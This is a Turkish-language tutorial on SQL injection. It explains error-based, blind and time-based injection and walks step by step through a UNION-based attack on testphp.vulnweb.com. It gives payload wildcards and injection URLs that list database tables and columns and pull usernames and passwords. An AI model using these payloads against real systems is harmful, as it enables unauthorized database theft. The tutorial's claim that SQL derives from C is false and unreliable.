# SQLi-nedir



## SQL Mantığı:

![basit tablo](/resimler/basit%20tablo.png)

sql injectionu anlamak için öncellikle sql yapısını anlamımız lazım.

sql Structured Query Language(Yapılandırılmış sorgu dili) diye açılımı olan fakat tarihin biraz daha öncesine baktığımızda açılımı Structured English Query Language(Yapılandırılmış ingilizce sorgu dili) diye geçen yazılım dilidir. Bunun sebebi sql dediğimiz yazılım dilinin büyük bir çoğunluğun matematik operatörlerinden ziyade ingilizce sorgu yazma üzerine tasarlanmasıyla alakalıydı. sorgu kelimesini açmak gerekirse sql dili bildiğimiz satır ve sutündan oluşan bir tablo tutar. İstediğimiz satır ve sutündaki herhangi bir veriyi çekmek için abartılı ve karışık kodlar yazmak yerine ingilizce cümleler yazarız

örn: "Kullanıcılar tablosundaki kişi adlarını ve soyadlarını bana getirir misin" Cümlesinin sql dilindeki yazılışı:
 ```
 SELECT kisi_adi, kisi_soyadi FROM Kullanıcılar;
 ```
Select ibaresi istediğimiz sutünları getirmek için kullanırken from ibaresi bu sutünların hangi tablodan geleceğini belirtir.
bu anlattığım en basit sql sorgu mantığıdır daha fazlası için lütfen sql dilini araştırın.


## SQL Injection Nedir?

SQL Injection, kendi sorgularımızı hedef sitede çalışan SQL sorgularının içine karıştırarak manipüle etmeyi amaçlar. Bu sayede sitelerde, şirketlerde veya kurumlarda bulunan bütün veriler ifşalanabilir. Örneklendirmek gerekirse, [Reon Sağlık Hizmetleri](https://www.kvkk.gov.tr/Icerik/7523/Kamuoyu-Duyurusu-Veri-Ihlali-Bildirimi-Reon-Saglik-Hizmetleri-Ins-Tur-San-ve-Tic-A-S-Ozel-Aktif-Hastanesi-) şirketinin veritabanı sızdırılmış ve hastaların adı, soyadı, TC kimlik numarası gibi hassas bilgiler ifşa edilmiştir. Şirketlerin ve kurumların elindeki veritabanlarının sızıldırması hem o kurum için hemde verisi bulunan kullancılar için büyük bir tehlikedir bu yüzden sql injection iyi anlanması ve tedbirlerinin alınması gerekmektedir.

SQL Injection'a geçmeden önce sitelerin hangi tarz sorgular çalıştırdığını anlamamız gerekli çünkü bir sızma testinde kaynak kodları göremeyeceğimiz için sitenin bize verdiği tepkilerine göre arkada çalışan sorguyu tahmin etmemiz gerekir. 

Örnek Sorgu 1 :
``` 
SELECT username,password FROM accounts WHERE username = 'User1' AND password = '123456' LIMIT 1;
```
 >Bu sorgu "accounts" adlı tablodan kullanıcı adının "user1" olduğu ve şifresinin "123456" olduğu satırı getirir. En sondaki "LIMIT 1" ibaresi ise tek satırda tek sorgu çalıştırmak için sınır koyar(sqli önlemek için). Bu tarz sorgular genellikle hesap giriş işlemleri için kullanılır. Eğer kullanıcı adı ve şifresi tabloda bulunursa "true" döndürür ve hesabımıza giriş yaparız.
 
Örnek Sorgu 2 :
``` 
SELECT * FROM products WHERE category = 'Gifts' 
```
>Bu tarz sorgular genellikle alışveriş siteleri veya blog sitelerinde bulunur. 'Gifts' yazan kısmı kullanıcıdan input olarak alır ve kullanıcının aradığı kelime ile ilgili ilanlar listelenir(örnek: Alışveriş sitelerinde arama kutuları).


## Sql İnjection Tespiti:

### Error Based Sqli:

Bu sql injection modelinde sitede çalışan sql sorgusunu bozarak sitenin bize hata mesajı göstermesi amaçlanmaktadır. Bu sayede hacker sql sorgusuna müdahele edebildiğini ve yazdığı payloadın hiç bir filtrelemeye takılmadan çalıştığını anlar.

Örneklendirmek gerekirse:

![error based](/resimler/phpvuln.png)

[PhpVuln](http://testphp.vulnweb.com/listproducts.php?cat=1) sitesinde kategori listelemek için bir parametre alıyor. Bunu " ?cat=1 " ibaresinden anlayabiliriz. cat kelimesi de category kelimesinin kısaltırması olduğunu tahmin ediyorum.

![tek_tirnak](/resimler/tek_tirnak.png)

Sitedeki url nin sonuna bir tane tek tırnak atarak sitede çalışan sorguyu bozmayı deneyeceğim.

![error based](/resimler/error_based.png)

ve site bize sql hatası verdi. Bu sonuca bakarsak bu sitede sql injection var diyebiliriz.

sonuç olarak arkadaki sorguyu şekillendirmeye çalışırsam şöyle olurdu

```
SELECT Productname, Description, Authors, ... FROM Listing WHERE category = '1'
```
>yukarıda yazdığım kolon adları ve tablo ismi tamamen tahmindir. Tablo adını ve kolonları öğrenmek için başka metodlar kullanmalıyız.


Error Based Sql İnjection için bazı wildcardlar:
``` 

'
"
')
")
`)
'))
"))
`))
--

```

### Blind Sqli:

Kör injection, yazdığımız sorguların bize herhangi bir dönüşünü göremediğimiz sorgulardır. genellikle site bize doğru sorgu yazarsak true yanlış kod yazarsak false döndürür. Hacker ise " % " operantını kullanarak kelimeleri tahmin etmeye çalışır. örneklendirmek gerekirse bir tabloda Kullanıcı adlarını çekmeye çalışalım. Bize true döndüren sorgunun sonuna "WHERE username LIKE 'a%'" deriz ve a ile başlayan kullanıcı adı varsa true döndürür eğer yoksa a yerine 29 harfi teker teker dener. Bir kullanıcı adının tamamı bu şekilde bulunur. Biraz yorucu gibi gözüksede otomatik toollarla bir hayli kolaylaşıyor.





### Time Based Sqli:
Zaman tabanlı sql injection, Girdiğimiz sorgu sonucunda ne bir hata çıktısı ne de bir true false döndürdüğü durumları kapsar. Hacker yazdığı kodun çalışıp çalışmadığını anlamak için kodunun sonuna bekleme komutu koyar ve ona dönen cevabın kaç saniyede döndüğüne göre sql açığını tespit eder. Örneklendirmek gerekirse
``` 
select sleep(10) from users where....
```
ifadesini var olan sorgunun sonuna yazar ve normalde dönecek olan cevabın 10 saniye daha geç gelmesini bekler. Eğer başarılı olursa sql injection vardır.





## Örnek SQL Injection:

Hedef Sitemiz : [vulnweb](http://testphp.vulnweb.com/listproducts.php?cat=1)

Aşamaları sıra ile sizde deneyerek sql injection yapmayı deneyebilirsiniz.

1) Test alanını belirlemek:<br>
![error based](/resimler/phpvuln.png)<br>
"?cat=1" parametresi bana şüpheli geldi ve burada sql injection testleri yapmaya karar verdim.<br>
```
http://testphp.vulnweb.com/listproducts.php?cat=1
```
2) sql injection zaafiyetinin tespiti:<br>
![tek_tirnak](/resimler/tek_tirnak.png)<br>
Tek Tırnak atarak sorguyu bozmaya çalışıyorum ve başarılı oluyorum.<br>
```
http://testphp.vulnweb.com/listproducts.php?cat=1'
```
![error based](/resimler/error_based.png)<br>

3) Şimdi kolon sayısını bulmamız lazım. Bunun Sebebi sql dili c dilinden üretilmiştir ve c dili matrix hesabı yaparken sutün sayıları eşit olmak zorundadır. Bu yüzden sırayla sutün sayısı arttırıyorum. not: ile 1,2,... şeklinde arttırmak yerine NULL,NULL,... şeklinde de arttırablirsiniz. not2: sitedeki diğer ilanları görmemek ve rahat çalışabilmek için sorgunun başındaki "?cat=1" ifadesindeki 1 değerini 99999 yaptım(yani olmayan bir id talep ettim).<br>
```
http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
```
![729](/resimler/729.png)<br>
Bu sayede olmayan bir ilan geldi ve 7, 2, 9, 11 sayıları geldi bu sayılar bu sitedeki içeriklerin hangi kolondan geldiğini beliritiyor.url de belirtilen sayılar yerine artık sql fonksiyonları yazabiliriz<br>

4) Kolon sayısını bulduktan sonra information_schema içindeki diğer tabloların bilgilerine erişeceğiz. information_schema'ı basitçe anlatmak gerekirse sistemdeki databaselerin bilgilerini tutan genel bir databasedir. bizde bu database sömüreceğiz.
```
http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 FROM information_schema.tables WHERE table_name = 'users'
```
![Tablolar](/resimler/tablolar.png)

Böylelikle sistemde bulunan tablo adlarını çekmiş olduk.

5) Tablo ismini çektikten sonra son önemli noktamız kolon isimlerini çekmektir. Bunun içinde tablo isminin users olan kolonları listeliyorum

```
http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name = 'users'
```
![kolonlar](/resimler/columns.png)

6) Artık tablo isimini ve kolonları bildiğimize göre istediğimiz veriyi rahatça çekebiliriz.
```
http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,concat(uname,":",pass),8,9,10,11 FROM users
```
![Veriler](/resimler/uname_pass.png)

Sonuç olarak kullanıcı_adı = test, şifresi = test.
